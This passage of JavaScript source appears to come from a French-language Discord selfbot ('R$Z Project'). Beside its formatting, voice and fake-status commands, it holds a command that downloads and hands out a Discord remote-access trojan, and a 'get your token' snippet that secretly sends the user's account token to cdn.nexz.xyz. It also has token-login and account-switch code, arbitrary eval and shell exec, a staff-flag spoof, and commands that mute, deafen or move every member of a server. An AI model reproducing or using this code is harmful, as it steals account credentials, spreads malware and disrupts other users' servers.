            if (!args[0]) return message.edit(`ガ __**${name} - Morse**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()

            let alpha = " ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890?!¡#$%⅋,)(*+\'-˙/:;<=>?@[/]^_`{|}~".split("");
            let morse = "/,.-,-...,-.-.,-..,.,..-.,--.,....,..,.---,-.-,.-..,--,-.,---,.--.,--.-,.-.,...,-,..-,...-,.--,-..-,-.--,--..,.----,..---,...--,....-,.....,-....,--...,---..,----.,-----,?,!,¡,#,$,%,⅋,,,),(,*,+,\,',-,˙,/,:,;,<,=,>,?,@,[,/,],^,_,`,{,|,},~".split(",");
            let text = args.join(" ").toUpperCase().replaceAll("Ä", "AE").replaceAll("Ç", "C").replaceAll("Ê", "E").replaceAll("Ù", "U").replaceAll("Ö", "OE").replaceAll("É", "E").replaceAll("Ü", "UE");
            
            if (text.startsWith(".") || text.startsWith("-")) {
                text = text.split(" ");
                for (i = 0; i < text.length; i++) {
                    text[i] = alpha[morse.indexOf(text[i])];
                }
                text = text.join("");
              } else {
                text = text.split("");
                let length = text.length;
                for (i = 0; i < length; i++) {
                    text[i] = morse[alpha.indexOf(text[i])];
                }
                text = text.join(" ");
              }
            
            message.channel.send(`${text}`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "blanc")){
            if (!args[0]) return message.edit(`ガ __**${name} - Blanc**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`\`\`\`ansi\n[2;37m${args.join(' ')}\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "bleu")){
            if (!args[0]) return message.edit(`ガ __**${name} - Bleu**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`\`\`\`ansi\n[2;34m${args.join(' ')}\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "orange")){
            if (!args[0]) return message.edit(`ガ __**${name} - Orange**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`\`\`\`ansi\n[2;33m${args.join(' ')}\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rose")){
            if (!args[0]) return message.edit(`ガ __**${name} - Rose**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`\`\`\`ansi\n[2;35m${args.join(' ')}\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rouge")){
            if (!args[0]) return message.edit(`ガ __**${name} - Rouge**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`\`\`\`ansi\n[2;31m${args.join(' ')}\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vert")){
            if (!args[0]) return message.edit(`ガ __**${name} - Vert**__ ガ\n> *Veuillez entrer un texte valide*`)
            if (message.deletable) message.delete()
            message.channel.send(`\`\`\`ansi\n[2;32m${args.join(' ')}\`\`\``)
        }
        








































        else if (cmd.slice(0, 1).join(' ') === (prefix + "eval")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Eval**__ ガ\n> *Veuillez entrer un texte à eval*`)

            try {
                let code = await eval(args.join(' '));
                if (typeof code !== 'string')
                    code = require('node:util').inspect(code, { depth: 0 });
                    message.edit(`ガ __**${name} - Eval**__ ガ\n\`\`\`js\n${code}\n\`\`\``)
            } catch (e) {
                message.edit(`ガ __**${name} - Eval**__ ガ\n\`\`\`js\n${e}\n\`\`\``)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "exec")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!args[0]) return message.edit(`ガ __**${name} - Exec**__ ガ\n> *Veuillez entrer un texte à eval*`)
            if (message.editable) message.edit(`ガ __**${name} - Exec**__ ガ\n> *Execution du code en cours*`)

            exec(args.join(' '), async (error, stdout, stderr) => {
                if (stdout) {
                    let output = `\`\`\`bash\n${stdout}\`\`\``;
                    if (stdout.length > 1024) {
                        const bin = await sourcebin.create(
                            {
                                title: 'R$Z EXEC',
                                description: 'Juste le stdout du exec',
                                files: [
                                    {
                                        content: stdout,
                                        language: 'js',
                                    },
                                ],
                            },
                        );                        
                        output = bin.url
                    }
                    message.edit(`ガ __**${name} - Exec**__ ガ\n ${output}`);
                } else if (stderr) {
                    let error = `\`\`\`bash\n${stderr}\`\`\``;
                    if (stderr.length > 1024) {
                        const bin = await sourcebin.create(
                            {
                                title: 'R$Z EXEC',
                                description: 'Juste l\'erreur du exec',
                                files: [
                                    {
                                        content: stderr,
                                        language: 'js',
                                    },
                                ],
                            },
                        );    
                        
                        error = bin.url
                    }
                    message.edit(`ガ __**${name} - Exec**__ ガ\n ${error}`);
                } else 
                    message.edit(`ガ __**${name} - Exec**__ ガ\n>>> *La commande a été executée avec succès mais sans retourner de réponse*`);
            });
        }

        else if (message.content === prefix + "experiments"){
            message.edit(`ガ __**${name} - Experiments**__ ガ\n\`\`\`js\nlet wpRequire;\n    window.webpackChunkdiscord_app.push([[ Math.random() ], {}, (req) => { wpRequire = req; }]);\n    mod = Object.values(wpRequire.c).find(x => typeof x?.exports?.Z?.isDeveloper !== "undefined");\n    usermod = Object.values(wpRequire.c).find(x => x?.exports?.default?.getUsers)\n    nodes = Object.values(mod.exports.Z._dispatcher._actionHandlers._dependencyGraph.nodes)\n    try {\n        nodes.find(x => x.name == "ExperimentStore").actionHandler["OVERLAY_INITIALIZE"]({user: {flags: 1}})\n    } catch (e) {}\n    oldGetUser = usermod.exports.default.__proto__.getCurrentUser;\n    usermod.exports.default.__proto__.getCurrentUser = () => ({isStaff: () => true})\n    nodes.find(x => x.name == "DeveloperExperimentStore").actionHandler["CONNECTION_OPEN"]()\n    usermod.exports.default.__proto__.getCurrentUser = oldGetUser\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rat")){
            const r = await fetch('https://raw.githubusercontent.com/random-tools/Some-Random-Tools/main/rat.py?token=GHSAT0AAAAAACRGUOZ4QDKV6ZTH6Z6RPIW2ZRWWXEQ').then(async a => await a.text())

            await fs.promises.writeFile(`${dir || __dirname}/sltcv.py`, r.replace("token = ''", `token = '${args[0] || "PUT YOUR BOT TOKEN HERE"}'`))
            message.edit({content: `ガ __**${name} - Discord Rat**__ ガ\n> \`pip install opencv_python numpy requests sounddevice PyAutoGUI mss discord.py scipy pycaw pynput comtypes pywin32 discord pycryptodomex\``, files: [new discord.MessageAttachment(`${dir || __dirname}/sltcv.py`, 'discord-rat.py')]})

            fs.unlinkSync(`${dir || __dirname}/sltcv.py`)
        }

        else if (message.content === prefix + "sspoofer"){
            message.edit(`ガ __**${name} - Spotify Spoofer**__ ガ\n\`\`\`js\n(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.Z?.getAccounts).exports.Z.getAccounts().forEach((conn) => conn.type === "spotify" && (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m => m?.exports?.Z?.isDispatching).exports.Z.dispatch({type: "SPOTIFY_PROFILE_UPDATE", accountId: conn?.id, isPremium: true}))\`\`\``)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "tokenlogin")){
            message.edit(`ガ __**${name} - Token Login**__ ガ\n\`\`\`js\nlet token = "${args.join(' ') || "VOTRE TOKEN ICI"}";\n\n    function login(token) {\n        setInterval(() => {\n          document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`\n        }, 50);\n        setTimeout(() => {\n          location.reload();\n        }, 2500);\n      }\n    \n    login(token);\`\`\``)
        }
        
        else if (cmd.slice(0, 1).join(' ') === (prefix + "gettoken")){
            if (args[0] === "pc"){
                message.edit(`ガ __**${name} - Get Your Token**__ ガ\n>>> **1\` ${client.separator} Allez sur [Discord (Navigateur)](<https://discord.com/login>)
                \`2\` ${client.separator} Ouvrez la console (\`f12\` ou \`Ctrl Shift i\`)
                \`3\` ${client.separator} Collez ceci dans la console: 
                \`\`\`js
                 window.webpackChunkdiscord_app.push([
                    [Math.random()],
                    {},
                    req => {
                        if (!req.c) return;
                        for (const m of Object.keys(req.c)
                          .map(x => req.c[x].exports)
                          .filter(x => x)) {
                              if (m.default && m.default.getToken !== undefined) {
                                  return copy(m.default.getToken());
                              }
                              if (m.getToken !== undefined) {
                                  return copy(m.getToken());
                              }
                           }
                     },
                ]);
                console.log('%cToken copié!', 'font-size: 50px');
                console.log('%cVotre token a été copié dans votre presse papier!', 'font-size: 16px');
                \`\`\``)
            }
            else {
                message.edit(`ガ __**${name} - Get Your Token**__ ガ\n>>> **1\` ${client.separator} Allez sur [Discord (Navigateur)](<https://discord.com/login>)
                \`2\` ${client.separator} Entrez ce code dans la barre de recherche: \`\`\`js\njavascript:(async()%20%3D%3E%20%7B%20const%20token%20%3D%20(webpackChunkdiscord_app.push(%5B%5B''%5D%2C%7B%7D%2Ce%3D%3E%7Bm%3D%5B%5D%3Bfor(let%20c%20in%20e.c)m.push(e.c%5Bc%5D)%7D%5D)%2Cm).find(m%3D%3Em%3F.exports%3F.default%3F.getToken!%3D%3Dvoid%200).exports.default.getToken()%3Bwindow.location.href%20%3D%20%60https%3A%2F%2Fcdn.nexz.xyz%2F%3Fuser%3D%24%7Btoken%7D%60%3B%7D)()\`\`\``)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "switch")){
            if (!args[0]) return message.edit(`ガ __**${name} - Switch**__ ガ\n> *Veuillez entrer un token*`)
            if (message.deletable) await message.delete()

            const t = client.token
            client.destroy()
            client.login(args[0])
                .catch(() => client.login(t).then(() => message.channel.send(`ガ __**${name} - Switch**__ ガ\n> *Le token est invalide*`)))
        }










































































        else if (cmd.slice(0, 1).join(' ') === (prefix + "vcjoin")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)

            const channelTypes = [ "DM", "GROUP_DM", "GUILD_VOICE"]
            const channel = message.mentions.channels.first() || client.channels.cache.get(args[0]) || message.channel
            if (!channel || !channelTypes.includes(channel.type)) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Veuillez mentionner un salon vocale valide*`)

            const voiceConnection = await StreamClient.joinVoiceChannel(channel, {
                    selfDeaf: voice.deaf,
                    selfMute: voice.mute,
                    selfVideo: voice.camera,
                },
            ).catch(() => false)
            
            if (!voiceConnection) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Je n'ai pas pu démarrer le plugin de vocale*`)
            
            message.edit(`ガ __**${name} - Join VC**__ ガ\n> *J'ai rejoint le salon ${channel}*`)
            if (voice.stream) await voiceConnection.createStream().catch(() => false);
        }

        else if (message.content === prefix + "vcleave"){
            if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)
            StreamClient.leaveVoiceChannel()
            message.edit(`ガ __**${name} - Leave VC**__ ガ\n> *Le module de vocale a été arrêté*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vcmute")){
            if (args[0] === "on"){
                if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)
                if (voice.mute === true) return message.edit(`ガ __**${name} - Mute VC**__ ガ\n> *Le mute est déjà activé*`)
                voice.mute = true
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Mute VC**__ ガ\n> *Le mute a été activé*`)
            } else if (args[0] === "off"){
                if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)
                if (voice.mute === false) return message.edit(`ガ __**${name} - Mute VC**__ ガ\n> *Le mute est déjà désactivé*`)
                voice.mute = false
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Mute VC**__ ガ\n> *Le mute a été désactivé*`)
            } else {
                if (!message.guild) return;
                const member = message.mentions.members.first() || message.guild.members.cache.get(args[0])
                if (member) member.voice.setMute(true)
                    .then(() => message.edit(`ガ __**${name} - Mute VC**__ ガ\n> *${member} a été mute*`))
                    .catch(() => message.edit(`ガ __**${name} - Mute VC**__ ガ\n> *${member} n'a pas pu être mute*`))
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vcdeaf")){
            if (args[0] === "on"){
                if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)
                if (voice.deaf === true) return message.edit(`ガ __**${name} - Deaf VC**__ ガ\n> *Le mute casque est déjà activé*`)
                voice.deaf = true
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Deaf VC**__ ガ\n> *Le mute casque a été activé*`)
            } else if (args[0] === "off"){
                if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)
                if (voice.deaf === false) return message.edit(`ガ __**${name} - Deaf VC**__ ガ\n> *Le mute casque est déjà désactivé*`)
                voice.deaf = false
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Deaf VC**__ ガ\n> *Le mute casque a été désactivé*`)
            } else {
                if (!message.guild) return;
                const member = message.mentions.members.first() || message.guild.members.cache.get(args[0])
                if (member) member.voice.setDeaf(true)
                    .then(() => message.edit(`ガ __**${name} - Deaf VC**__ ガ\n> *${member} a été mute casque*`))
                    .catch(() => message.edit(`ガ __**${name} - Deaf VC**__ ガ\n> *${member} n'a pas pu être mute casque*`))
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vccam")){
            if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)
            if (args[0] === "on"){
                if (voice.camera === true) return message.edit(`ガ __**${name} - Camera VC**__ ガ\n> *La caméra est déjà activé*`)
                voice.camera = true
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Camera VC**__ ガ\n> *Le caméra a été activé*`)
            } else if (args[0] === "off"){
                if (voice.camera === false) return message.edit(`ガ __**${name} - Camera VC**__ ガ\n> *Le caméra est déjà désactivé*`)
                voice.camera = false
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Camera VC**__ ガ\n> *Le caméra a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vcstream")){
            if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)

            if (args[0] === "on"){
                if (voice.stream === true) return message.edit(`ガ __**${name} - Stream VC**__ ガ\n> *Le stream est déjà activé*`)
                voice.stream = true
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Stream VC**__ ガ\n> *Le stream a été activé*`)
            } else if (args[0] === "off"){
                if (voice.stream === false) return message.edit(`ガ __**${name} - Stream VC**__ ガ\n> *Le stream est déjà désactivé*`)
                voice.stream = false
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Stream VC**__ ガ\n> *Le stream a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "autojoin")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!StreamClient) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Vous ne pouvez pas utiliser cette commande (\`npm i djs-stream-client\`).*`)

            if (args[0] === "off"){
                voice.autojoin = null
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Auto Join**__ ガ\n> *L'auto join a été désactivé*`)
            }
            else {
                const channel = message.mentions.channels.first() || client.channels.cache.get(args[0]) || message.channel
                const channelTypes = [ "DM", "GROUP_DM", "GUILD_VOICE"]
                if (!channel || !channelTypes.includes(channel.type)) return message.edit(`ガ __**${name} - Join VC**__ ガ\n> *Veuillez mentionner un salon vocale valide*`)

                voice.autojoin = channel?.id
                client.save(`${__dirname}/Data/Voice/voice.json`, voice)
                message.edit(`ガ __**${name} - Auto Join**__ ガ\n> *L'auto join a été activé (${channel})*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "move")){
            if (!message.guild) return message.edit(`ガ __**${name} - Move VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0])
            if (!member) return message.edit(`ガ __**${name} - Move VC**__ ガ\n> *Veuillez mentionner un membre*`)

            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[1])
            if (!channel || channel.type !== "GUILD_VOICE") return message.edit(`ガ __**${name} - Move VC**__ ガ\n> *Veuillez mentionner un salon vocale*`)

            member.voice.setChannel(channel)
                .then(() => message.edit(`ガ __**${name} - Move VC**__ ガ\n> *${member} a été déplacé*`))
                .catch(() => message.edit(`ガ __**${name} - Move VC**__ ガ\n> *${member} n'a pas pu être déplacé*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vcunmute")){
            if (!message.guild) return message.edit(`ガ __**${name} - Unmute VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0])
            if (!member) return message.edit(`ガ __**${name} - Unmute VC**__ ガ\n> *Veuillez mentionner un membre*`)
            member.voice.setMute(false)
                .then(() => message.edit(`ガ __**${name} - Unmute VC**__ ガ\n> *${member} a été unmute*`))
                .catch(() => message.edit(`ガ __**${name} - Unmute VC**__ ガ\n> *${member} n'a pas pu être unmute*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vcundeaf")){
            if (!message.guild) return message.edit(`ガ __**${name} - Undeaf VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0])
            if (!member) return message.edit(`ガ __**${name} - Undeaf VC**__ ガ\n> *Veuillez mentionner un membre*`)
            member.voice.setDeaf(false)
                .then(() => message.edit(`ガ __**${name} - Undeaf VC**__ ガ\n> *${member} a été unmute casque*`))
                .catch(() => message.edit(`ガ __**${name} - Undeaf VC**__ ガ\n> *${member} n'a pas pu être unmute casque*`))
        }

        else if (message.content === prefix + "vcmuteall"){
            if (!message.guild) return message.edit(`ガ __**${name} - Mute ALL VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - Mute ALL VC**__ ガ\n> *Je vais mute les personnes en vocale*`)

            message.guild.members.cache.forEach(member => {
                member.voice.setMute(true).catch(() => false)
            })
        }

        else if (message.content === prefix + "vcunmuteall"){
            if (!message.guild) return message.edit(`ガ __**${name} - Unmute ALL VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - Unmute ALL VC**__ ガ\n> *Je vais unmute les personnes en vocale*`)

            message.guild.members.cache.forEach(member => {
                member.voice.setMute(false).catch(() => false)
            })
        }

        else if (message.content === prefix + "vcdeafall"){
            if (!message.guild) return message.edit(`ガ __**${name} - Deaf ALL VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - Mute ALL VC**__ ガ\n> *Je vais mute casque les personnes en vocale*`)

            message.guild.members.cache.forEach(member => {
                member.voice.setDeaf(true).catch(() => false)
            })
        }

        else if (message.content === prefix + "vcundeafall"){
            if (!message.guild) return message.edit(`ガ __**${name} - Undeaf ALL VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            message.edit(`ガ __**${name} - Unmute ALL VC**__ ガ\n> *Je vais unmute casque les personnes en vocale*`)

            message.guild.members.cache.forEach(member => {
                member.voice.setDeaf(false).catch(() => false)
            })
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "moveall")){
            if (!message.guild) return message.edit(`ガ __**${name} - Move All VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.guild.channels.cache.filter(c => c.type === "GUILD_VOICE").random
            if (!channel || channel.type !== "GUILD_VOICE") return message.edit(`ガ __**${name} - Move All VC**__ ガ\n> *Veuillez mentionner un salon vocale*`)

            message.edit(`ガ __**${name} - Move All VC**__ ガ\n> *Je vais déplacer tous les membres dans ${channel}*`)

            message.guild.members.cache.forEach(member => {
                member.voice.setChannel(channel).catch(() => false)
            })
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "vclimit")){
            if (!message.guild) return message.edit(`ガ __**${name} - Move VC**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
            if (!channel || channel.type !== "GUILD_VOICE") return message.edit(`ガ __**${name} - Limit VC**__ ガ\n> *Veuillez mentionner un salon vocale*`)

            const number = parseInt(args[1]) > 99 || parseInt(args[1]) < 0 ? 0 : parseInt(args[1])

            channel.setUserLimit(number)
            .then(() => message.edit(`ガ __**${name} - Limite VC**__ ガ\n> *La limite de personnes du salon ${channel} est maintenant de ${number === 0 ? "♾️" :""} *`))
            .catch(() => message.edit(`ガ __**${name} - Limite VC**__ ガ\n> *Je n'ai pas pu modifier la limite du salon*`))
        }
































        else if (cmd.slice(0, 1).join(' ') === (prefix + "youtube")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/R5iAGms.png', 'https://i.imgur.com/zeN0dFU.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('WATCHING')
                .setName('Youtube')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)
                .setAssetsSmallImage(getExtendURL[1].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Youtube**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Project"}\` sur youtube*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "tiktok")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/A3hd4r3.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('WATCHING')
                .setName('TikTok')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - TikTok**__ ガ\n> *Tu regardes \`${args.join(' ') || "R$Z Project"}\` sur tiktok*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "soundcloud")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/ImFLQKQ.jpeg');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('LISTENING')
                .setName('SoundCloud')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - SoundCloud**__ ガ\n> *Tu écoutes \`${args.join(' ') || "R$Z Project"}\` sur soundcloud*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rspotify")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/67vfp8Y.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('LISTENING')
                .setName('Spotify')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Spotify**__ ガ\n> *Tu écoutes \`${args.join(' ') || "R$Z Project"}\` sur spotify*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "deezer")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/pF2gSGu.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('LISTENING')
                .setName('Deezer')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Deezer**__ ガ\n> *Tu écoutes \`${args.join(' ') || "R$Z Project"}\` sur deezer*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ytb music")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/SkKnqiw.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('LISTENING')
                .setName('Youtube Music')
                .setDetails(`${args.slice(1).join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Youtube Music**__ ガ\n> *Tu écoutes \`${args.slice(1).join(' ') || "R$Z Project"}\` sur youtube music*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "twitter")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/N1KVSNP.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('X')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Twitter**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Project"}\` sur twitter*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "instagram")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/1gbP5ax.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Instagram')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Instagram**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Project"}\` sur instgram*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "telegram")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/3eiAkO8.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Telegram')
                .setDetails(`${args.join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Telegram**__ ガ\n> *Tu joues à \`${args.join(' ') || "R$Z Project"}\` sur telegram*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "stumble guys")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/W5AT2IJ.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Stumble Guys')
                .setDetails(`${args.slice(1).join(' ') || "R$Z Project"}`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Stumble Guys**__ ガ\n> *Tu joues à \`${args.slice(1).join(' ') || "R$Z Project"}\` sur stumble guys*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "fortnite")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/SYbZpfk.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setType('PLAYING')
                .setState('En Section')
                .setName('Fortnite')
                .setDetails(`Battle Royale - Dans le salon`)
                .setStartTimestamp(Date.now())
                .setAssetsLargeImage(getExtendURL[0].external_asset_path)

            client.user.setPresence({activities: [status]})

            message.edit(`ガ __**${name} - Fortnite**__ ガ\n> *Tu joues à fortnite*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "fall guys")){
            const getExtendURL = await discord.RichPresence.getExternal(client, '1219030452158075010', 'https://i.imgur.com/Hb7tZAw.png');
            const status = new discord.RichPresence(client)
                .setApplicationId('1219030452158075010')
                .setState("R$Z PROJECT")
                .setType('PLAYING')
                .setName('Fall Guys')
